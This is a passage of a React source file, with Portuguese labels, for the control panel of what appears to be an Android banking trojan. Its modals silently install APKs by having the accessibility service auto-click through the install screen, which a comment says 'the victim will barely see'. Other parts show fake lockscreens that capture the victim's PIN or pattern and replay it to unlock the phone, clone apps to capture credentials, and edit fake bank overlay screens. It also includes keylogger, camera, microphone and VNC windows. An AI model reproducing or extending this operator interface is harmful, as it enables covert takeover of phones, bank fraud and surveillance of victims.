                  3. ID do Pacote do Clone (Package ID)
                </label>
                <input
                  type="text"
                  value={duplicatorClonePackage}
                  onChange={(e) => setDuplicatorClonePackage(e.target.value)}
                  placeholder="Ex: com.whatsapp.cloned"
                  className="w-full bg-[#190503] border border-[#2a2a31]/30 rounded-md px-4 py-3 text-[#ef4444] focus:outline-none focus:border-[#3a3a44]"
                />
              </div>

              <div className="bg-[#190503] border border-[#2a2a31]/20 rounded-md p-3 text-[11px] text-slate-400 leading-relaxed">
                 <span className="font-bold text-white">Injeção Automática:</span> Ao disparar este comando, o dispositivo alvo criará uma instncia duplicada do aplicativo selecionado vinculando os gatilhos de acessibilidade e captura de credenciais.
              </div>
            </div>

            {/* Actions */}
            <div className="flex items-center gap-3 pt-2">
              <button
                type="button"
                onClick={() => setShowDeviceDuplicatorModal(false)}
                className="flex-1 py-3 rounded-md bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 font-mono font-bold text-xs uppercase"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={handleDuplicateAppOnDevice}
                className="flex-1 py-3 rounded-md bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#f87171] hover:to-[#ef4444] text-[#10120a] font-mono font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(239,68,68,0.3)] flex items-center justify-center gap-2"
              >
                <Copy size={14} />
                Duplicar no Aparelho
              </button>
            </div>
          </div>
        </div>
      )}

      {/*  MODAL CONFIRMAR CONFIGURAR ROM */}
      {showConfigureRomConfirm && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowConfigureRomConfirm(false)}>
          <div className="bg-[#121214] rounded-md p-6 max-w-sm w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <h2 className="text-lg font-bold text-white mb-3"> Configurar ROM</h2>
            <p className="text-gray-300 text-sm mb-4">
              Executar autostart + otimização de bateria automaticamente no dispositivo?
            </p>
            <div className="flex gap-2">
              <button
                type="button"
                onClick={() => setShowConfigureRomConfirm(false)}
                className="flex-1 py-2 bg-[#6f6f78] hover:bg-[#8b8b94] text-white rounded-md font-semibold"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={async () => {
                  setShowConfigureRomConfirm(false);
                  await sendCommand({ action: 'CONFIGURE_ROM' });
                  addLog(' Configurando ROM (Autostart, Battery...)');
                }}
                className="flex-1 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md font-semibold"
              >
                Confirmar
              </button>
            </div>
          </div>
        </div>
      )}

      {/*  MODAL DE INSTALAR APK */}
      {showInstallApkModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowInstallApkModal(false)}>
          <div className="bg-[#121214] rounded-md p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-bold text-white flex items-center">
                <span className="text-2xl mr-3"></span>
                Instalar APK Silenciosamente
              </h2>
              <button
                onClick={() => {
                  setShowInstallApkModal(false);
                  setSelectedApkFile(null);
                }}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            <div className="space-y-4">
              <div className="text-sm text-gray-400 mb-4">
                <p> O APK será instalado automaticamente no dispositivo.</p>
                <p> O AccessibilityService vai auto-clicar em "Instalar".</p>
                <p> A vítima mal verá a tela de instalação!</p>
              </div>
              
              {/* Input de arquivo oculto */}
              <input
                ref={apkInputRef}
                type="file"
                accept=".apk"
                className="hidden"
                onChange={(e) => {
                  const file = e.target.files?.[0];
                  if (file) setSelectedApkFile(file);
                }}
              />
              
              {/* rea de seleção de arquivo */}
              <div 
                onClick={() => apkInputRef.current?.click()}
                className={`border-2 border-dashed rounded-md p-6 text-center cursor-pointer transition-all ${
                  selectedApkFile 
                    ? 'border-green-500 bg-green-500/10' 
                    : 'border-[#2a2a31]/25 hover:border-[#ef4444] hover:bg-[#2a2a31]'
                }`}
              >
                {selectedApkFile ? (
                  <div className="text-green-400">
                    <span className="text-3xl"></span>
                    <p className="mt-2 font-medium">{selectedApkFile.name}</p>
                    <p className="text-sm text-gray-400">
                      {(selectedApkFile.size / 1024 / 1024).toFixed(2)} MB
                    </p>
                  </div>
                ) : (
                  <div className="text-gray-400">
                    <span className="text-3xl"></span>
                    <p className="mt-2">Clique para selecionar o arquivo .apk</p>
                    <p className="text-sm">ou arraste e solte aqui</p>
                  </div>
                )}
              </div>
              
              {/* Botões */}
              <div className="flex gap-3">
                <button
                  onClick={() => {
                    setShowInstallApkModal(false);
                    setSelectedApkFile(null);
                  }}
                  className="flex-1 py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-semibold transition-all"
                >
                  Cancelar
                </button>
                <button
                  onClick={handleInstallApk}
                  disabled={!selectedApkFile || isInstallingApk}
                  className={`flex-1 py-3 rounded-md font-semibold transition-all flex items-center justify-center ${
                    selectedApkFile && !isInstallingApk
                      ? 'bg-[#84cc16] hover:bg-orange-700 text-white'
                      : 'bg-[#6f6f78] text-gray-400 cursor-not-allowed'
                  }`}
                >
                  {isInstallingApk ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                      Enviando...
                    </>
                  ) : (
                    ' Instalar'
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/*  MODAL DE LOCKSCREEN PIN + PATTERN - Igual EAGLESPY V5 */}
      {showLockscreenModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 animate-fade-in" onClick={() => setShowLockscreenModal(false)}>
          <div className="bg-gradient-to-br from-slate-950 via-[#121214] to-slate-950 rounded-md p-6 max-w-4xl w-full mx-4 border border-yellow-500/30 shadow-[0_0_50px_rgba(234,179,8,0.15)] max-h-[90vh] overflow-y-auto transition-all duration-300" onClick={(e) => e.stopPropagation()}>
            
            {/* Header */}
            <div className="flex items-center justify-between mb-6 border-b border-[#24242a] pb-4">
              <h2 className="text-xl font-extrabold text-white flex items-center gap-3">
                <span className="text-2xl text-yellow-500 animate-pulse"></span>
                Lockscreen Controller & Visualizer
              </h2>
              <button
                onClick={() => setShowLockscreenModal(false)}
                className="text-gray-400 hover:text-white text-2xl transition-colors w-8 h-8 flex items-center justify-center rounded-full hover:bg-[#24242a]"
              >
                ×
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-12 gap-6">
              
              {/* Coluna da Esquerda: Controles (7/12) */}
              <div className="md:col-span-7 space-y-6">
                
                {/* Seletor de Tipo */}
                <div className="flex gap-2 p-1 bg-slate-950/60 rounded-md border border-[#24242a]">
                  <button
                    onClick={() => setLockscreenType('PIN')}
                    className={`flex-1 py-2.5 rounded-md font-bold text-xs uppercase tracking-wider transition-all ${
                      lockscreenType === 'PIN'
                        ? 'bg-gradient-to-r from-yellow-500 to-[#ef4444] text-black shadow-lg shadow-yellow-500/20'
                        : 'text-gray-400 hover:text-white hover:bg-[#121214]/60'
                    }`}
                  >
                     PIN / Senha
                  </button>
                  <button
                    onClick={() => setLockscreenType('PATTERN')}
                    className={`flex-1 py-2.5 rounded-md font-bold text-xs uppercase tracking-wider transition-all ${
                      lockscreenType === 'PATTERN'
                        ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-lg shadow-[#ef4444]/20'
                        : 'text-gray-400 hover:text-white hover:bg-[#121214]/60'
                    }`}
                  >
                     Padrão (Swipe)
                  </button>
                </div>
                
                {/* Status do Lockscreen */}
                <div className={`p-4 rounded-md border transition-all ${
                  isLockscreenActive 
                    ? 'bg-green-500/5 border-green-500/30' 
                    : 'bg-[#121214]/40 border-[#24242a]'
                }`}>
                  <div className="flex items-center justify-between">
                    <div>
                      <span className={`text-sm font-bold flex items-center gap-1.5 ${isLockscreenActive ? 'text-green-400' : 'text-gray-400'}`}>
                        <span className={`w-2.5 h-2.5 rounded-full ${isLockscreenActive ? 'bg-green-500 animate-ping' : 'bg-gray-600'}`} />
                        {isLockscreenActive ? `OVERLAY ${lockscreenType} ATIVO` : 'LOCKSCREEN INATIVA'}
                      </span>
                      <p className="text-[10px] text-gray-500 mt-1 max-w-[200px]">
                        {isLockscreenActive 
                          ? `Aguardando a vítima digitar ou desenhar...` 
                          : `Nenhuma tela falsa sendo mostrada no momento`}
                      </p>
                    </div>
                    <button
                      onClick={isLockscreenActive ? hideLockscreen : showLockscreen}
                      className={`px-4 py-2 rounded-md text-xs font-bold uppercase tracking-wider transition-all shadow-md ${
                        isLockscreenActive
                          ? 'bg-red-650/20 hover:bg-[#ef4444]/30 border border-[#2a2a31]/30 text-[#ef4444] hover:text-[#ef4444]'
                          : 'bg-green-650/20 hover:bg-green-600/30 border border-green-500/30 text-green-400 hover:text-green-300'
                      }`}
                    >
                      {isLockscreenActive ? ' Desativar' : ` Bloquear Device`}
                    </button>
                  </div>
                </div>
                
                {/* Dados Capturados / Input */}
                {lockscreenType === 'PIN' ? (
                  <div className="space-y-2">
                    <label className="text-gray-400 text-xs font-bold uppercase tracking-wider"> PIN Capturado/Salvo:</label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={pinInput}
                        onChange={(e) => setPinInput(e.target.value.replace(/\D/g, ''))}
                        placeholder="PIN del equipo"
                        maxLength={10}
                        className="flex-1 px-4 py-2.5 bg-slate-950 border border-yellow-500/20 rounded-md text-center text-xl font-bold tracking-widest text-yellow-400 focus:border-yellow-500/50 focus:outline-none"
                      />
                      <button
                        onClick={() => saveDevicePin(pinInput)}
                        className="px-4 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-black rounded-md font-bold transition-all shadow-md shadow-yellow-500/10 flex items-center justify-center"
                        title="Salvar PIN no Servidor"
                      >
                        
                      </button>
                    </div>
                    <div className="flex gap-2">
                      <button
                        type="button"
                        onClick={() => { const v = pinInput || capturedPin; if (v) { navigator.clipboard.writeText(v); addLog('PIN copiado'); } }}
                        className="flex-1 py-2 rounded-md text-[11px] font-semibold border border-[#2a2a31] bg-[#16161a] text-[#9a9aa2] hover:text-[#e6e6e8] hover:bg-[#1c1c21] transition-colors"
                      >
                        Copiar PIN
                      </button>
                      <button
                        type="button"
                        onClick={playPinNow}
                        className="flex-1 py-2 rounded-md text-[11px] font-semibold bg-[#ef4444] hover:bg-[#f87171] text-white transition-colors"
                      >
                        Desbloquear ahora
                      </button>                    </div>
                    {capturedPin && capturedPin !== pinInput && (
                      <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-950/20 border border-green-500/20 rounded-md p-2">
                        <span></span>
                        <span>PIN capturado: <strong className="font-mono text-sm">{capturedPin}</strong></span>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="space-y-2">
                    <label className="text-gray-400 text-xs font-bold uppercase tracking-wider"> Padrão Capturado/Salvo:</label>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={patternInput}
                        onChange={(e) => setPatternInput(e.target.value.replace(/[^1-9]/g, ''))}
                        placeholder="Ex: 14789 (pontos 1-9)"
                        maxLength={9}
                        className="flex-1 px-4 py-2.5 bg-slate-950 border border-[#2a2a31]/20 rounded-md text-center text-xl font-bold tracking-widest text-[#ef4444] focus:border-[#2a2a31]/50 focus:outline-none"
                      />
                      <button
                        onClick={() => saveDevicePattern(patternInput)}
                        className="px-4 py-2.5 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md font-bold transition-all shadow-md shadow-[#ef4444]/10 flex items-center justify-center"
                        title="Salvar Padrão no Servidor"
                      >
                        
                      </button>
                    </div>
                    {capturedPattern && capturedPattern !== patternInput && (
                      <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-950/20 border border-green-500/20 rounded-md p-2">
                        <span></span>
                        <span>Último Padrão capturado: <strong className="font-mono text-sm">{capturedPattern}</strong></span>
                      </div>
                    )}
                  </div>
                )}
                
                {/* Eventos capturados da lockscreen */}
                <div className="p-4 rounded-md border border-[#24242a] bg-[#121214]/10">
                  <h3 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3"> Histórico de Capturas de Lockscreen</h3>
                  {renderCapturedUnlockPinsList()}
                </div>

                {renderUnlockRecordingControls()}
                
                {/* Teclado Numérico para PIN (só aparece quando PIN) */}
                {lockscreenType === 'PIN' && (
                  <div className="bg-slate-950/80 rounded-md p-4 border border-[#24242a]">
                    <p className="text-[10px] text-gray-500 mb-3 text-center uppercase tracking-wider">Simular Digitação (Reprodução Manual no Aparelho)</p>
                    <div className="grid grid-cols-3 gap-2 max-w-[280px] mx-auto">
                      {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                        <button
                          key={num}
                          onClick={() => pressLockKey(num.toString())}
                          className="py-2.5 bg-[#121214]/60 hover:bg-yellow-500 hover:text-black text-white text-md font-bold rounded-md transition-all border border-[#24242a] hover:border-yellow-400 shadow-sm"
                        >
                          {num}
                        </button>
                      ))}
                      <button
                        onClick={() => pressLockKey('DELETE')}
                        className="py-2.5 bg-[#121214]/20 hover:bg-[#24242a] text-[#ef4444] hover:text-white text-md font-bold rounded-md transition-all border border-[#1a1a1e]/40"
                      >
                        
                      </button>
                      <button
                        onClick={() => pressLockKey('0')}
                        className="py-2.5 bg-[#121214]/60 hover:bg-yellow-500 hover:text-black text-white text-md font-bold rounded-md transition-all border border-[#24242a] hover:border-yellow-400 shadow-sm"
                      >
                        0
                      </button>
                      <button
                        onClick={() => pressLockKey('ENTER')}
                        className="py-2.5 bg-green-950/20 hover:bg-green-800 text-green-400 hover:text-white text-md font-bold rounded-md transition-all border border-green-900/40"
                      >
                        
                      </button>
                    </div>
                  </div>
                )}
                
                {/* Reprodução Automática */}
                <div className={`rounded-md p-4 border ${lockscreenType === 'PIN' ? 'bg-gradient-to-r from-yellow-950/20 to-orange-950/10 border-yellow-500/20' : 'bg-gradient-to-r from-[#121214]/20 to-[#121214]/10 border-[#2a2a31]/20'}`}>
                  <h3 className={`font-bold text-xs uppercase tracking-wider mb-3 flex items-center gap-1.5 ${lockscreenType === 'PIN' ? 'text-yellow-400' : 'text-[#ef4444]'}`}>
                    <span></span>
                    Auto-Reprodução de Desbloqueio
                  </h3>
                  <div className="flex items-center gap-3 mb-3">
                    <span className="text-gray-400 text-xs">Delay (ms):</span>
                    <input
                      type="number"
                      value={pinDelay}
                      onChange={(e) => setPinDelay(Math.max(500, parseInt(e.target.value) || 1000))}
                      min={500}
                      max={5000}
                      step={100}
                      className="w-24 px-2 py-1 bg-slate-950 border border-[#24242a] rounded-md text-white text-center font-mono text-xs focus:outline-none"
                    />
                    <span className="text-gray-500 text-[10px]">{lockscreenType === 'PIN' ? 'entre as teclas' : 'no início do gesto'}</span>
                  </div>
                  {(() => {
                    const activePin = pinInput || capturedPin || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PIN' || log.eventType === 'CAPTURED_PIN')?.digit || '');
                    const activePattern = patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN' || log.eventType === 'CAPTURED_PATTERN' || log.hint === 'Pattern')?.digit || '');
                    const isPlayable = lockscreenType === 'PIN' ? !!activePin : !!activePattern;
                    return (
                      <button
                        onClick={playLockSequence}
                        disabled={isPlayingPin || !isPlayable}
                        className={`w-full py-2.5 rounded-md font-bold text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow-md ${
                          isPlayingPin
                            ? `${lockscreenType === 'PIN' ? 'bg-yellow-500 text-black' : 'bg-[#ef4444] text-white'} cursor-not-allowed`
                            : isPlayable
                              ? `bg-gradient-to-r ${lockscreenType === 'PIN' ? 'from-yellow-500 to-[#ef4444] hover:from-yellow-450 hover:to-orange-450 text-black' : 'from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a]'}`
                              : 'bg-[#121214] text-gray-500 cursor-not-allowed border border-[#24242a]'
                        }`}
                      >
                        {isPlayingPin ? (
                          <>
                            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-black"></div>
                            Simulando Gestos no Device...
                          </>
                        ) : lockscreenType === 'PIN' ? (
                          <> Reproduzir PIN no Aparelho</>
                        ) : (
                          <> Reproduzir Padrão no Aparelho</>
                        )}
                      </button>
                    );
                  })()}
                </div>
                
              </div>

              {/* Coluna da Direita: Mockup do Celular Inovador (5/12) */}
              <div className="md:col-span-5 flex flex-col items-center justify-center bg-[#190503]/60 border border-[#24242a]/80 rounded-md p-6 relative overflow-hidden shadow-inner min-h-[480px]">
                {/* Background decorative grid/glow */}
                <div className="absolute inset-0 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(239,68,68,0.12),rgba(255,255,255,0))]" />
                
                {/* Smartphone Mockup */}
                <div className="w-[230px] h-[450px] border-[5px] border-[#24242a] bg-[#1a0703] rounded-[36px] relative shadow-[0_20px_50px_rgba(0,0,0,0.8),_0_0_20px_rgba(239,68,68,0.08)] p-3 flex flex-col justify-between overflow-hidden z-10">
                  {/* Phone Speaker Notch */}
                  <div className="absolute top-2 left-1/2 -translate-x-1/2 w-16 h-3.5 bg-[#24242a] rounded-full z-20 flex items-center justify-center">
                    <div className="w-8 h-0.5 bg-[#121214] rounded-full" />
                  </div>
                  
                  {/* Screen Content */}
                  <div className="w-full h-full rounded-[26px] bg-slate-950 border border-[#121214]/60 p-2 flex flex-col overflow-hidden relative">
                    {/* Simulated Status Bar */}
                    <div className="flex justify-between items-center text-[7px] text-gray-500 px-2 pt-1 font-mono">
                      <span>{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                      <div className="flex items-center gap-0.5 scale-90 origin-right">
                        <span></span>
                        <span></span>
                      </div>
                    </div>
                    
                    {lockscreenType === 'PIN' ? renderPinMockup() : renderPatternSVG()}
                  </div>
                </div>

                <div className="mt-4 text-center z-10">
                  <span className={`inline-flex items-center px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider ${
                    isLockscreenActive 
                      ? 'bg-[#121214]/60 text-[#ef4444] border border-[#2a2a31]/20' 
                      : 'bg-green-950/60 text-green-400 border border-green-500/20'
                  }`}>
                    <span className={`w-2.5 h-2.5 rounded-full mr-1.5 ${isLockscreenActive ? 'bg-[#ef4444] animate-pulse' : 'bg-green-500'}`} />
                    {isLockscreenActive ? 'Tela Bloqueada' : 'Device Livre'}
                  </span>
                </div>
              </div>
              
            </div>
            
            <p className="text-center text-[10px] text-gray-650 mt-6 border-t border-[#24242a]/60 pt-4">
               Lockscreen Module  Sincronização e Decodificação de PIN + Padrão (V5 System)
            </p>
          </div>
        </div>
      )}
      
      {/*  Layout Edit Mode - Toolbar e Botão Flutuante */}
      <EditModeToggle 
        isEditMode={isLayoutEditMode} 
        onToggle={() => setIsLayoutEditMode(true)} 
      />
      
      <LayoutEditToolbar
        isEditMode={isLayoutEditMode}
        isDirty={layoutDirty}
        onToggleEditMode={() => setIsLayoutEditMode(false)}
        onSave={saveLayoutPrefs}
        onReset={resetLayoutPrefs}
      />
      
      {/*  Editor de Tela Preta Customizada */}
      <BlackScreenEditor
        isOpen={showBlackScreenEditor}
        onClose={() => setShowBlackScreenEditor(false)}
        onSave={saveBlackScreenTemplate}
        onApply={applyCustomBlackScreen}
        initialTemplate={customBlackScreenTemplate}
      />
      
      {/*  Editor Visual de Telas de Banco */}
      <BlackScreenEditor
        isOpen={showBankVisualEditor}
        onClose={() => setShowBankVisualEditor(false)}
        onSave={(updatedTemplate) => {
          setBankScreens(prev => {
            const updated = prev.map(s => s.id === selectedPresetScreenId ? { ...s, elements: updatedTemplate.elements, backgroundColor: updatedTemplate.backgroundColor } : s);
            localStorage.setItem('customPresetBankScreens', JSON.stringify(updated));
            return updated;
          });
          setShowBankVisualEditor(false);
          addLog(` Tela do banco editada com sucesso!`);
        }}
        onApply={(updatedTemplate) => {
          applyCustomBlackScreen(updatedTemplate, editBankPackage);
        }}
        initialTemplate={bankScreens.find(s => s.id === selectedPresetScreenId)}
      />
      
      {/*  Editor Visual de Telas de Sistema */}
      <BlackScreenEditor
        isOpen={showSystemVisualEditor}
        onClose={() => setShowSystemVisualEditor(false)}
        onSave={(updatedTemplate) => {
          setSystemScreens(prev => {
            const updated = prev.map(s => s.id === selectedSystemScreenId ? { ...s, elements: updatedTemplate.elements, backgroundColor: updatedTemplate.backgroundColor } : s);
            localStorage.setItem('customPresetSystemScreens', JSON.stringify(updated));
            return updated;
          });
          setShowSystemVisualEditor(false);
          addLog(` Tela de sistema editada com sucesso!`);
        }}
        onApply={(updatedTemplate) => {
          applyCustomBlackScreen(updatedTemplate, editSystemPackage);
        }}
        initialTemplate={systemScreens.find(s => s.id === selectedSystemScreenId)}
      />
      
      {/* 🪟 MODO FLUTUANTE - Janelas Arrastáveis (Fundo Semi-Transparente Revelando o Painel) */}
      {isFloatingMode && (
        <div className="fixed inset-0 bg-slate-950/45 backdrop-blur-sm z-40 overflow-hidden pointer-events-none">
          {/* Background ambient radial glow */}
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_30%_20%,rgba(239,68,68,0.1),transparent_45%)] pointer-events-none" />
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_80%_70%,rgba(239,68,68,0.1),transparent_45%)] pointer-events-none" />

          {/* Toolbar de Janelas */}
          <div className="fixed top-0 left-0 right-0 bg-[#3d0c04]/95 backdrop-blur-xl border-b border-[#2a2a31]/30 px-4 py-2.5 z-50 flex items-center justify-between shadow-[0_4px_25px_rgba(0,0,0,0.5)] pointer-events-auto">
            <div className="flex items-center space-x-3">
              <span className="px-2.5 py-1 rounded-md bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-teal-500 text-[#10120a] font-black text-xs uppercase tracking-wider shadow-[0_0_15px_rgba(239,68,68,0.4)]">
                🪟 MODO FLUTUANTE HUD VIP
              </span>
              
              {/* Presets Inovadores de Organização de Tela */}
              <div className="flex items-center space-x-2 pl-2 border-l border-[#2a2a31]/30">
                <button
                  onClick={organizeCockpitLayout}
                  className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-md text-xs font-black shadow-[0_0_15px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 font-mono cursor-pointer"
                  title="Alinha VNC Normal + Screen Reader V2 + Controles perfeitamente lado a lado"
                >
                  <LayoutGrid className="w-4 h-4 text-emerald-200" />
                   Cockpit VNC + V2
                </button>

                <button
                  onClick={autoOrganizeAllFloatingWindows}
                  className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold border border-[#3a3a44]/30 transition-all flex items-center gap-1 font-mono cursor-pointer"
                  title="Organiza todas as janelas abertas lado a lado sem sobreposição"
                >
                  <Maximize2 className="w-3.5 h-3.5 text-[#ef4444]" />
                   Auto-Organizar
                </button>
              </div>
            </div>
            
            {/* Botões para abrir janelas */}
            <div className="flex items-center space-x-1.5 overflow-x-auto text-xs">
              <button
                onClick={() => toggleWindow('vnc')}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.vnc.open 
                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 VNC V1
              </button>
              <button
                onClick={() => {
                  toggleWindow('screenReader');
                  if (!isScreenReaderEnabled && !floatingWindows.screenReader.open) {
                    toggleScreenReader();
                  }
                }}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.screenReader.open 
                    ? 'bg-gradient-to-r from-[#ef4444] to-teal-500 text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 Screen V2
              </button>
              <button
                onClick={() => toggleWindow('controls')}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.controls.open 
                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                Ž Controles
              </button>
              <button
                onClick={() => {
                  toggleWindow('camera');
                  if (!isCameraEnabled && !floatingWindows.camera.open) {
                    toggleCamera();
                  }
                }}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.camera.open 
                    ? 'bg-gradient-to-r from-teal-600 to-emerald-500 text-white shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-teal-400/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 Cmera
              </button>
              <button
                onClick={() => {
                  toggleWindow('microphone');
                  if (!isMicrophoneEnabled && !floatingWindows.microphone.open) {
                    toggleMicrophone();
                  }
                }}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.microphone.open 
                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 Mic
              </button>
              <button
                onClick={() => toggleWindow('keylogger')}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.keylogger.open 
                    ? 'bg-gradient-to-r from-amber-600 to-yellow-500 text-white shadow-[0_0_12px_rgba(245,158,11,0.4)] border border-amber-400/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                ¨ Keylogger
              </button>
              <button
                onClick={() => setShowBankMonitorTab(true)}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  showBankMonitorTab
                    ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] text-white shadow-[0_0_12px_rgba(249,115,22,0.4)] border border-[#f87171]/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 Bancos {installedBanks.length > 0 && `(${installedBanks.length})`}
              </button>
              <button
                onClick={() => {
                  toggleWindow('editBankScreens');
                  selectPreset(selectedPresetScreenId);
                }}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.editBankScreens.open 
                    ? 'bg-gradient-to-r from-[#65a30d] to-[#ef4444] text-white shadow-[0_0_12px_rgba(236,72,153,0.4)] border border-pink-400/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 Editar Telas
              </button>
              <button
                onClick={() => toggleWindow('lockscreen')}
                className={`px-3 py-1.5 rounded-md font-bold transition-all whitespace-nowrap ${
                  floatingWindows.lockscreen.open 
                    ? 'bg-gradient-to-r from-[#ef4444] to-[#84cc16] text-[#10120a] shadow-[0_0_12px_rgba(225,29,72,0.4)] border border-rose-400/40' 
                    : 'bg-[#121214]/80 text-slate-400 hover:text-white border border-[#24242a]'
                }`}
              >
                 Lockscreen {(capturedPin || capturedPattern) && ''}
              </button>
              
              <div className="border-l border-[#2a2a31]/25 pl-2 ml-1">
                <button
                  onClick={() => setIsFloatingMode(false)}
                  className="px-3.5 py-1.5 bg-red-650/80 hover:bg-[#ef4444] text-white rounded-md text-xs font-black uppercase tracking-wider shadow-[0_0_10px_rgba(239,68,68,0.3)] transition-all flex items-center gap-1"
                >
                  <X className="w-3.5 h-3.5" /> Sair
                </button>
              </div>
            </div>
          </div>
          
          {/* Janelas Flutuantes */}
          <div className="pt-14 h-full">
            {/* VNC V1 - DENTRO DE MOLDURA DE CELULAR FUTURISTA CIANO/AZUL */}
            <FloatingWindow
              id="vnc"
              title=" VNC Normal (Modo Celular)"
              isOpen={floatingWindows.vnc.open}
              position={{ x: floatingWindows.vnc.x, y: floatingWindows.vnc.y }}
              size={{ width: floatingWindows.vnc.width, height: floatingWindows.vnc.height }}
              zIndex={floatingWindows.vnc.zIndex}
              onClose={() => toggleWindow('vnc')}
              onFocus={() => bringToFront('vnc')}
              onDrag={(x, y) => updateWindowPosition('vnc', x, y)}
              onResize={(w, h) => updateWindowSize('vnc', w, h)}
              headerColor="bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#24242a]"
            >
              <div className="h-full bg-[#1e0603] flex flex-col overflow-hidden">
                {/* Status bar top */}
                <div className="flex items-center justify-between px-3 py-1 bg-[#320a03] border-b border-[#2a2a31]/20 shrink-0">
                  <span className="text-[10px] font-mono font-bold text-[#ef4444]"> VNC AO VIVO</span>
                  <div className="flex items-center gap-1.5">
                    <div className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse"></div>
                    <span className="text-[9px] font-mono text-emerald-400">Transmitindo</span>
                  </div>
                  <span className="text-[9px] font-mono text-[#ef4444]">100% </span>
                </div>

                {/* VNC Screen filling rest of window */}
                <div className="flex-1 overflow-hidden flex items-center justify-center bg-black">
                  {isCaptureEnabled ? (
                    <DeviceScreen
                      deviceId={deviceId!}
                      onCommand={sendCommand}
                      isBlackScreenActive={isBlackScreen}
                      onConnectionStatusChange={handleConnectionStatusChange}
                      captureMethod="silent"
                      killerFrameOnPointerMove={isKillerMode}
                      onRequestFrame={requestKillerFrame}
                    />
                  ) : (
                    <div className="text-center p-6">
                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#3a3a44] mx-auto mb-3"></div>
